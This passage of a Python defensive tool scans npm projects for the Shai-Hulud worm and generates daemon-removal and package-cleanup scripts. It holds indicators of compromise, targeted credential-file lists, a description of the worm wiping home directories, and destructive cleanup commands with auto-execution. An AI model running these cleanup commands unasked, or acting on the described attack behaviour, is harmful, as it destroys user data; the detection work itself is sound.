    ``cmds`` is a list of argv lists, e.g. ``[["npm", "cache", "clean", "--force"]]`` —
    never shell strings. Package names therefore reach the OS as literal argv
    elements and can never be interpreted as shell metacharacters. Returns True
    only if every command exits 0 (tolerant steps such as removing an absent
    daemon unit log their non-zero exit and continue).
    """
    all_ok = True
    for argv in cmds:
        if not _run(argv, cwd=cwd):
            all_ok = False
    return all_ok


def _execute_ps(cmd: str) -> bool:
    """Execute a PowerShell command (Windows only)."""
    try:
        r = subprocess.run(
            ["powershell", "-ExecutionPolicy", "Bypass", "-Command", cmd],
            capture_output=True, text=True, timeout=30, errors="replace")
        if r.returncode == 0:
            ok("  PowerShell: OK")
        else:
            warn(f"  PowerShell exit {r.returncode}: {r.stderr[:150]}")
        return r.returncode == 0
    except Exception as e:
        warn(f"  PowerShell failed: {e}")
        return False


def _write_daemon_script(plat: str, out_dir: Path) -> Optional[Path]:
    """Write a platform-specific daemon-removal script to out_dir."""
    try:
        if plat == "linux":
            path = out_dir / "remove_daemon.sh"
            path.write_text(
                "#!/bin/bash\n"
                "# Shai-Hulud daemon removal — Linux\n"
                "# Run BEFORE revoking any tokens.\n"
                "set -e\n"
                "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\n"
                "echo '[*] Stopping gh-token-monitor daemon...'\n"
                "systemctl --user stop gh-token-monitor 2>/dev/null || true\n"
                "systemctl --user disable gh-token-monitor 2>/dev/null || true\n"
                "rm -f ~/.config/systemd/user/gh-token-monitor.service\n"
                "systemctl --user daemon-reload\n"
                "echo '[+] Daemon removed. Running post-patch verification...'\n"
                "python3 \"$SCRIPT_DIR/shai_hulud_guard.py\" --verify --path \"$SCRIPT_DIR\" || true\n"
                "echo '[!] NOW safe to rotate credentials.'\n",
                encoding="utf-8")
            os.chmod(str(path), 0o755)  # noqa: S103 (0o755 intentional — generated scripts must be executable)
        elif plat == "darwin":
            path = out_dir / "remove_daemon.sh"
            path.write_text(
                "#!/bin/bash\n"
                "# Shai-Hulud daemon removal — macOS\n"
                "# Run BEFORE revoking any tokens.\n"
                "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\n"
                "PLIST=~/Library/LaunchAgents/com.user.gh-token-monitor.plist\n"
                "echo '[*] Unloading LaunchAgent...'\n"
                "launchctl unload \"$PLIST\" 2>/dev/null || true\n"
                "rm -f \"$PLIST\"\n"
                "echo '[+] Daemon removed. Running post-patch verification...'\n"
                "python3 \"$SCRIPT_DIR/shai_hulud_guard.py\" --verify --path \"$SCRIPT_DIR\" || true\n"
                "echo '[!] NOW safe to rotate credentials.'\n",
                encoding="utf-8")
            os.chmod(str(path), 0o755)  # noqa: S103 (0o755 intentional — generated scripts must be executable)
        elif plat == "windows":
            path = out_dir / "remove_daemon.ps1"
            path.write_text(
                "# Shai-Hulud daemon removal — Windows PowerShell\n"
                "# Run as Administrator BEFORE revoking any tokens.\n"
                "$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path\n"
                "$keywords = @('gh-token-monitor','github-token-monitor','npm-helper','bun-helper','node-updater')\n"
                "foreach ($kw in $keywords) {\n"
                "  Get-ScheduledTask | Where-Object { $_.TaskName -like \"*$kw*\" }"
                " | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue\n"
                "}\n"
                "$startup = [Environment]::GetFolderPath('Startup')\n"
                "Get-ChildItem $startup | Where-Object { $_.Name -match 'gh-token|npm-helper|bun-helper' }"
                " | Remove-Item -Force -ErrorAction SilentlyContinue\n"
                "Write-Host '[+] Daemon removal complete. Running post-patch verification...'\n"
                "python \"$ScriptDir\\shai_hulud_guard.py\" --verify --path \"$ScriptDir\"\n"
                "Write-Host '[!] NOW safe to rotate credentials.'\n",
                encoding="utf-8")
        else:
            return None
        ok(f"Script written: {path.name}")
        return path
    except Exception as e:
        warn(f"Could not write daemon removal script: {e}")
        return None


def _write_cleanup_script(plat: str, bad_packages: List[str], out_dir: Path) -> Optional[Path]:
    """Write a package cleanup script to out_dir."""
    pkgs_str = " ".join(shlex.quote(p) for p in bad_packages) if bad_packages else ""
    uninstall_line = f"npm uninstall --ignore-scripts {pkgs_str}" if pkgs_str else "# No specific bad packages — full clean"
    try:
        if plat == "windows":
            path = out_dir / "clean_packages.ps1"
            path.write_text(
                f"# Shai-Hulud package cleanup — PowerShell\n"
                f"$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path\n"
                f"Set-Location '{out_dir}'\n"
                f"npm cache clean --force\n"
                f"{uninstall_line}\n"
                f"Remove-Item -Recurse -Force node_modules -ErrorAction SilentlyContinue\n"
                f"Remove-Item package-lock.json -ErrorAction SilentlyContinue\n"
                f"npm ci --ignore-scripts\n"
                f"Write-Host '[+] Clean reinstall complete. Running post-patch verification...'\n"
                f"python \"$ScriptDir\\shai_hulud_guard.py\" --verify --path \"$ScriptDir\"\n",
                encoding="utf-8")
        else:
            path = out_dir / "clean_packages.sh"
            path.write_text(
                f"#!/bin/bash\n"
                f"# Shai-Hulud package cleanup\n"
                f"SCRIPT_DIR=\"$(cd \"$(dirname \"${{BASH_SOURCE[0]}}\")\" && pwd)\"\n"
                f"cd '{out_dir}'\n"
                f"npm cache clean --force\n"
                f"{uninstall_line}\n"
                f"rm -rf node_modules package-lock.json\n"
                f"npm ci --ignore-scripts\n"
                f"echo '[+] Clean reinstall complete. Running post-patch verification...'\n"
                f"python3 \"$SCRIPT_DIR/shai_hulud_guard.py\" --verify --path \"$SCRIPT_DIR\" || true\n",
                encoding="utf-8")
            os.chmod(str(path), 0o755)  # noqa: S103 (0o755 intentional — generated scripts must be executable)
        ok(f"Script written: {path.name}")
        return path
    except Exception as e:
        warn(f"Could not write cleanup script: {e}")
        return None


def _print_verification_steps(plat: str) -> None:
    """Print manual verification steps for uncertain/low-confidence cases."""
    steps = [
        "1. Check for daemon (the definitive indicator):",
    ]
    if plat == "linux":
        steps += [
            "   systemctl --user status gh-token-monitor",
            "   ls ~/.config/systemd/user/ | grep gh-token",
        ]
    elif plat == "darwin":
        steps += [
            "   ls ~/Library/LaunchAgents/ | grep gh-token",
            "   launchctl list | grep gh-token",
        ]
    else:  # windows
        steps += [
            "   schtasks /query | findstr /i gh-token",
            '   Get-ScheduledTask | Where-Object {$_.TaskName -like "*gh-token*"}',
        ]
    steps += [
        "",
        "2. Check for unauthorized git commits:",
        "   git log --oneline -20",
        "   git log --diff-filter=A --name-only",
        "",
        "3. Check running processes:",
        "   ps aux | grep -E 'bun|gh-token|node.*monitor'" if plat != "windows"
        else '   Get-Process | Where-Object {$_.Name -match "bun|gh-token|monitor"}',
        "",
        "4. Search for known payload files:",
        "   find node_modules -name 'router_init.js' -o -name 'setup_bun.js' 2>/dev/null",
        "",
        "5. Run dedicated lockfile audit:",
        "   python shai_hulud_guard.py --lockcheck --path .",
    ]
    for s in steps:
        print(f"    {s}")


def generate_remediation(
    case: str,
    confidence: str,
    daemon_found: bool,
    bad_packages: List[str],
    project_path: Path,
    auto: bool = False,
) -> None:
    """Print and optionally execute platform-specific remediation for each case."""
    plat = platform.system().lower()
    head("AUTOMATED REMEDIATION PLAN")
    info(f"Case       : {case}")
    info(f"Confidence : {confidence}")
    print()

    # ── CLEAN ─────────────────────────────────────────────────────────────────
    if case == CASE_CLEAN:
        ok("No remediation required — scan found no infection indicators.")
        return

    # ── UNCERTAIN / LOW_CONFIDENCE ────────────────────────────────────────────
    if case in (CASE_UNCERTAIN, CASE_LOW_CONFIDENCE):
        subh("VERIFICATION STEPS  (ambiguous findings — manual review required)")
        if confidence == "MEDIUM":
            warn("Low-confidence positive result — verify before assuming infection.")
        else:
            info("Ambiguous findings — complete these checks before taking action.")
        print()
        _print_verification_steps(plat)
        return

    # ── Active infection cases ────────────────────────────────────────────────
    needs_daemon   = case in (CASE_DAEMON_ONLY, CASE_FULL_COMPROMISE)
    needs_packages = case in (CASE_PACKAGES_ONLY, CASE_FULL_COMPROMISE, CASE_LOCKFILE_TAMPER)

    step = 1

    if needs_daemon:
        subh(f"STEP {step} — DAEMON REMOVAL  (do NOT revoke tokens before this)")
        crit("⚑  Revoking a token before daemon removal triggers  rm -rf ~/")
        crit("   You have ~24 hours from infection before daemon self-destructs.")
        print()
        if plat == "linux":
            cmds = [
                "systemctl --user stop gh-token-monitor 2>/dev/null || true",
                "systemctl --user disable gh-token-monitor 2>/dev/null || true",
                "rm -f ~/.config/systemd/user/gh-token-monitor.service",
                "systemctl --user daemon-reload",
            ]
            for c in cmds:
                print(f"    {c}")
            if auto:
                info("Auto-executing daemon removal...")
                _execute_cmds([
                    ["systemctl", "--user", "stop", "gh-token-monitor"],
                    ["systemctl", "--user", "disable", "gh-token-monitor"],
                    ["rm", "-f", str(Path.home() / ".config/systemd/user/gh-token-monitor.service")],
                    ["systemctl", "--user", "daemon-reload"],
                ], "daemon removal")
        elif plat == "darwin":
            cmds = [
                "launchctl unload ~/Library/LaunchAgents/com.user.gh-token-monitor.plist 2>/dev/null || true",
                "rm -f ~/Library/LaunchAgents/com.user.gh-token-monitor.plist",
            ]
            for c in cmds:
                print(f"    {c}")
            if auto:
                info("Auto-executing daemon removal...")
                _execute_cmds([
                    ["launchctl", "unload", str(Path.home() / "Library/LaunchAgents/com.user.gh-token-monitor.plist")],
                    ["rm", "-f", str(Path.home() / "Library/LaunchAgents/com.user.gh-token-monitor.plist")],
                ], "daemon removal")
        else:  # windows
            ps = (
                "$kw=@('gh-token-monitor','github-token-monitor','npm-helper','bun-helper','node-updater');"
                "foreach($k in $kw){Get-ScheduledTask|Where-Object{$_.TaskName -like \"*$k*\"}"
                "|Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue}"
            )
            print("    # PowerShell (run as Administrator):")
            print(f"    {ps}")
            if auto:
                info("Auto-executing daemon removal (PowerShell)...")
                # `ps` is built only from the hardcoded keyword list above — no
                # registry/lockfile/user data is ever interpolated into it (§5.8).
                _execute_ps(ps)
        script = _write_daemon_script(plat, project_path)
        if script:
            info(f"Ready-to-run removal script: {script.name}")
        step += 1

    if needs_packages:
        subh(f"STEP {step} — PACKAGE CLEANUP")
        if bad_packages:
            info(f"Compromised package(s): {', '.join(bad_packages)}")
        else:
            info("No specific packages identified — performing full clean reinstall")
        print()
        if bad_packages:
            print(f"    npm uninstall --ignore-scripts {' '.join(bad_packages)}")
        print("    npm cache clean --force")
        if plat == "windows":
            print("    Remove-Item -Recurse -Force node_modules")
            print("    Remove-Item package-lock.json")
        else:
            print("    rm -rf node_modules package-lock.json")
        print("    npm ci --ignore-scripts")
        if auto:
            info("Auto-executing package cleanup...")
            try:
                if bad_packages:
                    _execute_cmds([["npm", "uninstall", "--ignore-scripts", *bad_packages]],
                                  "uninstall bad packages", project_path)
                _execute_cmds([["npm", "cache", "clean", "--force"]], "clear npm cache")
                nm = project_path / "node_modules"
                lf = project_path / "package-lock.json"
                if nm.exists():
                    shutil.rmtree(str(nm))
                    ok("node_modules removed")
                if lf.exists():
                    lf.unlink()
                    ok("package-lock.json removed")
                _execute_cmds([["npm", "ci", "--ignore-scripts"]], "clean reinstall", project_path)
            except Exception as e:
                warn(f"Auto-cleanup error: {e}")
        _write_cleanup_script(plat, bad_packages, project_path)
        step += 1

    # ── Credential rotation (always shown) ────────────────────────────────────
    subh(f"STEP {step} — CREDENTIAL ROTATION  (after daemon confirmed removed)")
    if case in (CASE_DAEMON_ONLY, CASE_FULL_COMPROMISE):
        crit("MANDATORY: Treat ALL credentials on this machine as compromised.")
    else:
        warn("RECOMMENDED: Rotate if any compromised package ran lifecycle scripts.")
    print("""
    1. GitHub PATs:  Settings → Developer settings → PATs → Revoke all
    2. npm tokens:   npm token list  →  npm token revoke <id>
    3. SSH keys:     Generate new keypair from a CLEAN machine
    4. AWS:          IAM → Security credentials → Delete all access keys
    5. GCP:          gcloud iam service-accounts keys delete <key-id>
    6. CI/CD:        Rotate all secrets in GitHub Actions / GitLab / CircleCI
    """)

# ═══════════════════════════════════════════════════════════════════════════════
#  MODE 1 — SCAN
# ═══════════════════════════════════════════════════════════════════════════════
def run_scan(project_path: Path) -> int:
    """
    Scan project for Shai-Hulud infection indicators.
    Returns total number of findings (0 = clean by heuristics).
    """
    head("SHAI-HULUD INFECTION SCANNER")
    info(f"Project : {project_path.resolve()}")
    info(f"System  : {platform.system()} {platform.release()} ({platform.machine()})")
    info(f"Python  : {platform.python_version()}")
    info(f"Scan at : {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}")

    total           = 0
    daemon_found    = False
    bad_packages: List[str] = []
    lockfile_critical = 0
    pattern_hits    = 0

    # ── CHECK 1: Persistence daemon ──────────────────────────────────────────
    subh("CHECK 1/8  Persistence daemon  (definitive compromise indicator)")
    plat = platform.system().lower()
    for dp in DAEMON_PATHS.get(plat, []):
        if dp.exists():
            crit(f"DAEMON FOUND: {dp}")
            crit("This is definitive evidence of active Shai-Hulud infection.")
            crit("⚑  DO NOT revoke tokens yet — isolate the machine first!")
            crit("    Revoking a token triggers rm -rf ~/ within 60 seconds.")
            daemon_found = True
            total += 1
    if plat == "windows":
        win_found = check_windows_persistence()
        if win_found:
            daemon_found = True
            for entry in win_found:
                crit(f"WINDOWS PERSISTENCE: {entry}")
                total += 1
        elif not daemon_found:
            ok("No known persistence entries in Task Scheduler or Startup folder")
            info("Also verify: schtasks /query | findstr /i gh-token")
    elif not daemon_found:
        ok("No persistence daemon found at known paths")

    # ── CHECK 2: package.json — known compromised versions ───────────────────
    subh("CHECK 2/8  package.json  (known compromised versions & dependency hygiene)")
    pkg_json_path = project_path / "package.json"
    if not pkg_json_path.exists():
        warn(f"No package.json found at {pkg_json_path}")
        dim("Pass --path to point to your project root")
    else:
        try:
            pkg = json.loads(pkg_json_path.read_text(encoding="utf-8", errors="replace"))
            all_deps: Dict[str, str] = {}
            for section in ("dependencies", "devDependencies", "peerDependencies", "optionalDependencies"):
                all_deps.update(pkg.get(section, {}))
            info(f"Found {len(all_deps)} total dependencies")
            bad_count = 0
            git_dep_count = 0
            for dep, ver_spec in all_deps.items():
                if dep in KNOWN_BAD:
                    known = KNOWN_BAD[dep]
                    clean = re.sub(r"[^0-9.]", "", ver_spec)
                    if known["bad"] and clean in known["bad"]:
                        crit(f"CONFIRMED COMPROMISED: {dep}@{clean}  (waves: {', '.join(known['waves'])})")
                        bad_packages.append(f"{dep}@{clean}")
                        total += 1
                        bad_count += 1
                    elif dep in HIGH_VALUE_TARGETS:
                        warn(f"High-value target (repeatedly attacked): {dep}@{ver_spec}")
                        warn(f"   Waves: {', '.join(known.get('waves', ['unknown']))}")
                if any(ver_spec.startswith(p) for p in ("git", "github:", "bitbucket:", "gitlab:", "file:")):
                    warn(f"Non-registry dependency (runs prepare hooks): {dep}: {ver_spec}")
                    git_dep_count += 1
                    total += 1
            if bad_count == 0:
                ok(f"No known-compromised versions in {len(all_deps)} dependencies")
            if git_dep_count == 0:
                ok("All dependencies reference the npm registry")
            dim(f"Known-bad list may lag → cross-check: {IOC_REPO}")
        except Exception as e:
            warn(f"Could not parse package.json: {e}")

    # ── CHECK 3: Lock file presence & hygiene ────────────────────────────────
    subh("CHECK 3/8  Lock file & install hygiene")
    lockfiles = {
        "package-lock.json": "npm ci",
        "yarn.lock":         "yarn install --frozen-lockfile",
        "pnpm-lock.yaml":    "pnpm install --frozen-lockfile",
    }
    found_locks = [name for name in lockfiles if (project_path / name).exists()]
    if found_locks:
        ok(f"Lock file(s) present: {', '.join(found_locks)}")
        for lf in found_locks:
            info(f"  Use '{lockfiles[lf]}' in CI — never bare 'npm install'")
    else:
        warn("No lock file — dependency versions are not pinned")
        total += 1

    npmrc = project_path / ".npmrc"
    if npmrc.exists():
        if "min-release-age" in npmrc.read_text(encoding="utf-8", errors="replace"):
            ok(".npmrc has min-release-age set")
        else:
            info(".npmrc present but missing 'min-release-age=7d'  (recommended)")
    else:
        info("No .npmrc — consider adding: min-release-age=7d")

    # ── CHECK 3.5: package-lock.json deep analysis (NEW) ─────────────────────
    subh("CHECK 3.5/8  package-lock.json deep analysis  (integrity & resolved URLs)")
    if (project_path / "package-lock.json").exists():
        lf_findings, lockfile_critical = scan_lockfile(project_path)
        if lf_findings:
            for f in lf_findings:
                lvl = f["level"]
                fn = crit if lvl == "CRITICAL" else warn if lvl in ("HIGH", "MEDIUM") else info
                fn(f["msg"])
                if f["detail"]:
                    dim(f"  → {f['detail'][:80]}")
                total += 1
            hint = "--lockcheck for full report"
            if lockfile_critical:
                crit(f"{lockfile_critical} CRITICAL lockfile finding(s) — run {hint}")
            else:
                warn(f"{len(lf_findings)} lockfile issue(s) — run {hint}")
        else:
            ok("package-lock.json: resolved URLs and integrity hashes look clean")
            try:
                lock = json.loads((project_path / "package-lock.json").read_text(encoding="utf-8"))
                ok(f"Verified {len(_lockfile_packages(lock))} locked package entries")
            except Exception:
                pass
    else:
        info("No package-lock.json — skipping deep lockfile analysis")

    # ── CHECK 4: node_modules deep scan ──────────────────────────────────────
    subh("CHECK 4/8  node_modules  (malicious files & lifecycle hook patterns)")
    nm_path = project_path / "node_modules"
    if not nm_path.exists():
        info("node_modules not present — run 'npm ci --ignore-scripts' first, then re-scan")
    else:
        scanned = 0
        nm_findings = 0
        pkg_dirs: List[Path] = []
        for entry in nm_path.iterdir():
            if entry.name.startswith("@") and entry.is_dir():
                pkg_dirs.extend(e for e in entry.iterdir() if e.is_dir())
            elif entry.is_dir() and not entry.name.startswith("."):
                pkg_dirs.append(entry)

        for pdir in pkg_dirs:
            scanned += 1
            for fname in MALICIOUS_FILENAMES:
                fpath = pdir / fname
                if fpath.exists():
                    crit(f"PAYLOAD FILE: {fpath}")
                    nm_findings += 1
                    total += 1
            meta_path = pdir / "package.json"
            if meta_path.exists():
                try:
                    meta = json.loads(meta_path.read_text(encoding="utf-8", errors="replace"))
                    pkg_full_name = meta.get("name", pdir.name)
                    for hook in ("preinstall", "install", "postinstall", "prepare"):
                        script_val = meta.get("scripts", {}).get(hook)
                        if script_val:
                            for desc, risk, _snippet in scan_text(script_val):
                                fn = crit if risk == "CRITICAL" else warn
                                fn(f"{risk} [{hook}] in {pkg_full_name}: {desc}")
                                dim(f"Script: {script_val[:120]}")
                                nm_findings += 1
                                pattern_hits += 1
                                total += 1
                except Exception:
                    pass

        ok(f"Scanned {scanned} installed packages")
        if nm_findings == 0:
            ok("No malicious indicators in node_modules")

    # ── CHECK 5: Credential exposure ──────────────────────────────────────────
    subh("CHECK 5/8  Credential file presence  (targeted by worm)")
    exposed = [f for f in CREDENTIAL_FILES if f.exists()]
    if exposed:
        warn(f"{len(exposed)} credential file(s) on disk — targeted by worm's sweep:")
        for f in exposed:
            dim(str(f))
        info("If infection suspected → rotate ALL credentials before reconnecting")
    else:
        ok("No credential files found at standard paths")

    # ── CHECK 6: GitHub Actions workflow audit ────────────────────────────────
    subh("CHECK 6/8  GitHub Actions workflows  (CI/CD attack surface)")
    gha_dir = project_path / ".github" / "workflows"
    if not gha_dir.exists():
        info("No .github/workflows directory — skipping")
    else:
        workflow_files = list(gha_dir.glob("*.yml")) + list(gha_dir.glob("*.yaml"))
        if not workflow_files:
            info("No workflow files found")
        else:
            wf_issues = 0
            for wf in workflow_files:
                content = wf.read_text(encoding="utf-8", errors="replace")
                name = wf.name
                if "pull_request_target" in content and re.search(r"actions/cache|cache@", content):
                    crit(f"{name}: pull_request_target + cache = cache-poisoning vector")
                    crit("   Fix: use pull_request trigger OR isolate fork-code from cache writes")
                    wf_issues += 1
                    total += 1
                if re.search(r"^permissions:\s*\n(.*\n)*?.*id-token:\s*write", content, re.MULTILINE):
                    warn(f"{name}: id-token: write at workflow level (should be job-scoped)")
                    wf_issues += 1
                if re.search(r"\bnpm install\b(?!\s+--ignore-scripts)", content):
                    info(f"{name}: 'npm install' found — use 'npm ci --ignore-scripts' in CI")
                tag_pins = re.findall(r"uses:\s+[^/]+/[^@]+@v\d", content)
                if tag_pins:
                    warn(f"{name}: {len(tag_pins)} action(s) pinned by tag not commit SHA")
                    dim("  Pin to commit SHA: uses: actions/checkout@<sha>")
            if wf_issues == 0:
                ok(f"Scanned {len(workflow_files)} workflow file(s) — no critical misconfigurations")
            else:
                warn(f"Found {wf_issues} issue(s) across {len(workflow_files)} workflow file(s)")

    # ── CHECK 7: npm registry config audit (NEW) ──────────────────────────────
    subh("CHECK 7/8  npm registry config  (C2 redirect detection)")
    try:
        r = subprocess.run(["npm", "config", "get", "registry"],
                           capture_output=True, text=True, timeout=10, errors="replace")
        if r.returncode == 0:
            registry = r.stdout.strip()
            if "registry.npmjs.org" in registry:
                ok(f"npm registry: {registry}")
            else:
                warn(f"Non-default npm registry: {registry}")
                warn("  Verify this is intentional (private registry), not a C2 redirect")
                total += 1
        else:
            info("npm config check returned non-zero — skipping")
    except FileNotFoundError:
        info("npm not found in PATH — skipping registry check")
    except Exception as e:
        info(f"npm registry check skipped: {e}")

    # ── CHECK 8: Installed Python packages ───────────────────────────────────
    subh("CHECK 8/8  Installed Python packages  (known-bad PyPI version check)")
    pip_hits = _check_pip_packages()
    if pip_hits:
        for pip_pkg, pip_ver, pip_waves in pip_hits:
            crit(f"CONFIRMED BAD PYPI PACKAGE: {pip_pkg}=={pip_ver}  (waves: {pip_waves})")
            total += 1
        info("Remediation:")
        for pip_pkg, _pip_ver, _ in pip_hits:
            info(f"  pip uninstall {pip_pkg}  &&  pip install {pip_pkg}  (latest clean version)")
    else:
        ok("No known-compromised PyPI packages found in current Python environment")
        dim("Uses current Python interpreter — re-run inside each virtualenv to check it")

    # ── Classify infection and summarise ─────────────────────────────────────
    case, confidence = classify_infection(
        daemon_found=daemon_found,
        bad_pkg_count=len(bad_packages),
        lockfile_critical=lockfile_critical,
        pattern_hits=pattern_hits,
        total_findings=total,
    )

    head("SCAN RESULT")
    if total == 0:
        ok("No infection indicators found by heuristic scan")
        ok("All checks passed")
        info("Absence of findings does NOT guarantee a clean state.")
        info(f"For authoritative IOC check: {IOC_REPO}")
    else:
        crit(f"{total} finding(s) detected — review output above")
        info(f"Infection case : {case}")
        info(f"Confidence     : {confidence}")
        print()
        if daemon_found:
            crit("⚑  PRIORITY ACTION: daemon found → follow incident response guide")
            print()
            run_incident(brief=True)
        elif case != CASE_CLEAN:
            info("Run  --patch  for automated remediation assistance:")
            info(f"  python shai_hulud_guard.py --patch --path {project_path}")
        else:
            info("Findings above are hygiene warnings — no active infection indicators.")
            info("Run  --lockcheck  for full lockfile detail.")

    # JSON sink (--json mode only)
    _json_record_mode_result(
        mode="scan",
        target=str(project_path),
        risk_score=min(total * 5, 100),
        case=case if 'case' in dir() else (CASE_CLEAN if total == 0 else CASE_UNCERTAIN),
        confidence=confidence if 'confidence' in dir() else ("DEFINITIVE" if total == 0 else "LOW"),
        findings=[],   # run_scan emits inline-only; rich structured findings come from --diagnose
    )
    return total

# ═══════════════════════════════════════════════════════════════════════════════
#  MODE 2 — CHECK  (pre-install safety analysis)
# ═══════════════════════════════════════════════════════════════════════════════
def run_check(package_spec: str) -> None:
    """Comprehensive pre-install check for a given npm package[@version]."""
    head(f"PRE-INSTALL ANALYSIS: {package_spec}")

    # ── Parse spec ────────────────────────────────────────────────────────────
    if package_spec.startswith("@"):
        tail = package_spec[1:]
        if "@" in tail:
            scope_and_name, requested_version = tail.rsplit("@", 1)
            pkg_name = f"@{scope_and_name}"
        else:
            pkg_name = f"@{tail}"
            requested_version = None
    else:
        if "@" in package_spec:
            pkg_name, requested_version = package_spec.rsplit("@", 1)
        else:
            pkg_name = package_spec
            requested_version = None

    info(f"Package : {pkg_name}")
    info(f"Version : {requested_version or 'latest'}")
    info(f"Registry: {REGISTRY_BASE}")

    risk_score = 0
    findings: List[Tuple[str, str]] = []

    # ── STEP 1: Registry metadata ─────────────────────────────────────────────
    subh("STEP 1/5  Registry metadata")
    encoded_name = urllib.parse.quote(pkg_name, safe="@/")
    meta = fetch_json(f"{REGISTRY_BASE}/{encoded_name}")
    if not meta:
        crit("Cannot reach registry — check package name or network access")
        return

    if not requested_version:
        requested_version = meta.get("dist-tags", {}).get("latest", "")
        info(f"Resolved latest: {requested_version}")

    all_versions = meta.get("versions", {})
    if requested_version not in all_versions:
        _is_confirmed_bad = pkg_name in KNOWN_BAD and requested_version in KNOWN_BAD[pkg_name].get("bad", [])
        if _is_confirmed_bad:
            crit(f"Version {requested_version} NOT in registry — removed by npm")
            crit(f"CONFIRMED MALICIOUS: {pkg_name}@{requested_version}")
            crit(f"Waves: {', '.join(KNOWN_BAD[pkg_name].get('waves', []))}")
            _early_findings = [Finding(
                level="CRITICAL",
                title=f"CONFIRMED MALICIOUS: {pkg_name}@{requested_version}",
                detail=f"Version pulled from npm registry. Campaign waves: {', '.join(KNOWN_BAD[pkg_name].get('waves', []))}",
                path=f"{pkg_name}@{requested_version}",
                score_contribution=100,
                advisories=list(KNOWN_BAD[pkg_name].get("advisories", [])),
            )]
            _json_record_mode_result(
                mode="check",
                target=f"{pkg_name}@{requested_version}",
                risk_score=100,
                case=CASE_PACKAGES_ONLY,
                confidence="DEFINITIVE",
                findings=_early_findings,
            )
        else:
            crit(f"Version '{requested_version}' not found in registry")
            info(f"Available dist-tags: {list(meta.get('dist-tags', {}).keys())}")
            _json_record_mode_result(
                mode="check",
                target=f"{pkg_name}@{requested_version}",
                risk_score=0,
                case=CASE_UNCERTAIN,
                confidence="UNCERTAIN",
                findings=[Finding(level="INFO", title=f"Version {requested_version} not in registry")],
            )
        if _is_confirmed_bad and not _JSON_MODE:
            sys.exit(1)
        return

    version_meta = all_versions[requested_version]
    time_data    = meta.get("time", {})
    publish_ts   = time_data.get(requested_version)

    if publish_ts:
        publish_dt      = datetime.fromisoformat(publish_ts.replace("Z", "+00:00"))
        age_total_hours = (datetime.now(timezone.utc) - publish_dt).total_seconds() / 3600
        age_days        = int(age_total_hours // 24)
        age_hours       = int(age_total_hours % 24)
        ok(f"Published : {publish_ts[:19]}Z  ({age_days}d {age_hours}h ago)")
        if age_total_hours < 6:
            crit(f"Published {age_hours}h ago — CRITICAL risk window")
            risk_score += 40
            findings.append(("CRITICAL", f"Published only {age_hours}h ago"))
        elif age_total_hours < 24:
            warn(f"Published {int(age_total_hours)}h ago — active attack risk window")
            risk_score += 25
            findings.append(("HIGH", f"Published {int(age_total_hours)}h ago (24h risk window)"))
        elif age_days < 7:
            warn(f"Published {age_days}d ago — below recommended min-release-age of 7d")
            risk_score += 10
            findings.append(("MEDIUM", f"Published {age_days}d ago"))
        else:
            ok("Package age exceeds 7-day minimum release age heuristic")
    else:
        warn("Publish timestamp unavailable")

    maintainers = version_meta.get("maintainers", meta.get("maintainers", []))
    ok(f"Maintainers: {len(maintainers)}  ({', '.join(m.get('name','?') for m in maintainers[:5])})")
    if len(maintainers) == 1:
        info("Single-maintainer: one account compromise = full package compromise")

    ok(f"Total versions in registry: {len(all_versions)}")

    # Typosquatting check (general supply-chain protection beyond Shai-Hulud)
    _typo = check_typosquatting(pkg_name)
    if _typo:
        _tdesc, _trisk = _typo
        (warn if _trisk == "HIGH" else info)(_tdesc)
        risk_score += 15 if _trisk == "HIGH" else 5
        findings.append((_trisk, _tdesc))

    # ── STEP 2: Known-bad version ─────────────────────────────────────────────
    subh("STEP 2/5  Known compromised version database")
    if pkg_name in KNOWN_BAD:
        entry = KNOWN_BAD[pkg_name]
        if entry["bad"] and requested_version in entry["bad"]:
            crit(f"CONFIRMED COMPROMISED: {pkg_name}@{requested_version}")
            crit(f"Campaign waves: {', '.join(entry['waves'])}")
            crit("DO NOT INSTALL.")
            risk_score += 100
            findings.append(("CRITICAL", f"Confirmed compromised version ({', '.join(entry['waves'])})"))
        else:
            warn(f"{pkg_name} is a known Shai-Hulud high-value target")
            warn(f"Version {requested_version} not confirmed bad, but apply heightened scrutiny")
            risk_score += 15
            findings.append(("MEDIUM", "Package is a known repeated Shai-Hulud target"))
    elif pkg_name in HIGH_VALUE_TARGETS:
        warn(f"{pkg_name} is in the high-value target set — applying heightened scrutiny")
        risk_score += 10
    else:
        ok("Package not in known-compromised or high-value-target lists")
    dim(f"Known-bad list lags → always cross-check: {IOC_REPO}")

    # ── STEP 2.5: Dynamic heuristics ──────────────────────────────────────────
    subh("STEP 2.5/5  Dynamic heuristics  (maintainer drift, semver gap, new deps)")
    _any_heuristic = False
    for desc, risk in check_maintainer_change(meta, requested_version):
        _any_heuristic = True
        fn = crit if risk == "CRITICAL" else warn
        fn(desc)
        # Score by exact level: a *removed* maintainer is LOW/informational (+0);
        # an *added* maintainer is MEDIUM (+10, the worm's account-takeover
        # vector); +20 reserved for a future HIGH. Fixes the OPEN-2 doc/code
        # mismatch where LOW fell through the old `if HIGH else 10` to +10.
        risk_score += {"HIGH": 20, "MEDIUM": 10, "LOW": 0}.get(risk, 0)
        findings.append((risk, desc))
    _gap = check_version_gap(meta, requested_version)
    if _gap:
        _any_heuristic = True
        desc, risk = _gap
        fn = crit if risk == "CRITICAL" else warn
        fn(desc)
        risk_score += 20 if risk == "HIGH" else 8
        findings.append((risk, desc))
    _dep_hits = check_new_dependencies(meta, requested_version)
    _non_reg = [(d, r) for d, r in _dep_hits if r == "HIGH"]
    _low_deps = [(d, r) for d, r in _dep_hits if r == "LOW"]
    for desc, risk in _non_reg:
        _any_heuristic = True
        warn(desc)
        risk_score += 15
        findings.append((risk, desc))
    if _low_deps:
        _any_heuristic = True
        info(f"{len(_low_deps)} new dep(s) added vs previous version — review if unexpected")
    if not _any_heuristic:
        ok("Maintainers stable · version gap normal · no new dependencies")

    # ── STEP 3: Lifecycle scripts ─────────────────────────────────────────────
    subh("STEP 3/5  Lifecycle scripts  (from registry metadata — no execution)")
    scripts = version_meta.get("scripts", {})
